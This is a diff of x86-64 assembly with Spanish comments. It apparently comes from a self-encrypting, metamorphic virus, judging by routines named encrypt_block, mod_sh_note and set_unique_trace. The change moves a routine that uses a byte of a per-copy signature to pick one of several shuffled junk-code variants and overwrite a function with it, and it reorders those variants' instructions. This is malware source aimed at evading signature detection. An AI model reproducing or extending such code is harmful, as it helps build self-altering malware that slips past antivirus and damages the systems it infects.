@@ -116,7 +116,6 @@ section .text
         dec rdx
         nop
         cmp rbx, rbx
-        jne __F_crazy
         mov rax, rax
         xchg rax, rax
         nop word [rax+rax]
@@ -131,7 +130,7 @@ section .text
         cmp rbx, rsi
         ret
     __F_crazy__end:
-	F_crazy_len equ $ - __F_crazy -1
+	F_crazy_len equ $ - __F_crazy
 
     __F_encrypt_block:
         lea r10, [rel __F_data]         ; base función
@@ -287,6 +286,33 @@ section .text
 
         ret
     __F_mod_sh_note__end:
+
+
+    __F_mod_functions:
+        xor edx, edx
+        lea rsi, [rel Traza]
+        movzx eax, byte [rsi + Traza_len + 1]
+        mov ebx, 3
+        div ebx
+
+        ; multiplicamos dl * F_crazy_len
+        movzx rbx, dl
+        xor edx, edx
+        mov rax, F_crazy_len
+        mul rbx
+
+        ; en rax tendemos dl * F_crazy_len
+        ; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy
+        ; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
+        ; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
+        lea rsi, [rel __F_crazy0]
+        add rsi, rax
+        lea rdi, [rel __F_crazy]
+        mov rcx, F_crazy_len
+        cld
+        rep movsb
+        ret
+    __F_mod_functions__end:
 
 ; ----------------------------------------------------------------------------------------------------------------------
 
@@ -750,29 +776,7 @@ section .text
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
-		; Calculamos signature[0] mod 2
-		xor edx, edx
-		lea rsi, [rel Traza]
-		movzx eax, byte [rsi + Traza_len + 1]
-		mov ebx, 3
-		div ebx
-
-		; multiplicamos dl * F_crazy_len
-		movzx rbx, dl
-		xor edx, edx
-		mov rax, F_crazy_len
-		mul rbx
-
-		; en rax tendemos dl * F_crazy_len
-		; rsi + (dl * F_crazy_len) => direccion de memoria de la funcion a copiar como __F_crazy
-		; rdi                      => direccion de memoria de la __F_crazy a sobreescribir
-		; memcpy(__F_crazy, __F_crazy0 + rax, F_crazy_len);
-		lea rsi, [rel __F_crazy0]
-		add rsi, rax
-		lea rdi, [rel __F_crazy]
-		mov rcx, F_crazy_len
-		cld
-		rep movsb
+        CALL_ENCRYPT(mod_functions)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -870,38 +874,37 @@ section .text
     Traza_len       equ     $ - Traza - 1 - 8 - 1
 
     __F_crazy0:
-        inc rax
         dec rax
+        inc rax
         nop
         inc rbx
         dec rbx
         inc rdx
-        dec rdx
         inc rdx
+        dec rdx
         dec rdx
         nop
         cmp rbx, rbx
-        jne __F_crazy0
         mov rax, rax
         xchg rax, rax
-        nop dword [rax+rax]
-        add rax, 0
         nop word [rax+rax]
+        nop dword [rax+rax]
         lea rax, [rax]
+        add rax, 0
         sub rax, 0
-        and rax, -1
         or  rax, 0
+        and rax, -1
+        not rax
         not rax
         cmp rbx, rsi
-        not rax
         ret
     __F_crazy0__end:
 
     __F_crazy1:
-        inc rax
         inc rdx
-        nop
+        inc rax
         dec rax
+        nop
         inc rbx
         dec rbx
         inc rdx
@@ -909,45 +912,43 @@ section .text
         dec rdx
         nop
         cmp rbx, rbx
-        jne __F_crazy1
         mov rax, rax
         xchg rax, rax
         nop word [rax+rax]
         nop dword [rax+rax]
-        and rax, -1
         lea rax, [rax]
+        add rax, 0
         sub rax, 0
         or  rax, 0
+        and rax, -1
         not rax
-        add rax, 0
         not rax
         cmp rbx, rsi
         ret
     __F_crazy1__end:
 
     __F_crazy2:
-        inc rax
-        inc rdx
         nop
+        inc rax
         dec rax
         inc rbx
-        inc rdx
         dec rbx
-        xchg rax, rax
+        inc rdx
+        inc rdx
         dec rdx
         dec rdx
         nop
         cmp rbx, rbx
-        jne __F_crazy1
         mov rax, rax
+        xchg rax, rax
         nop word [rax+rax]
         nop dword [rax+rax]
-        and rax, -1
         lea rax, [rax]
+        add rax, 0
         sub rax, 0
         or  rax, 0
+        and rax, -1
         not rax
-        add rax, 0
         not rax
         cmp rbx, rsi
         ret
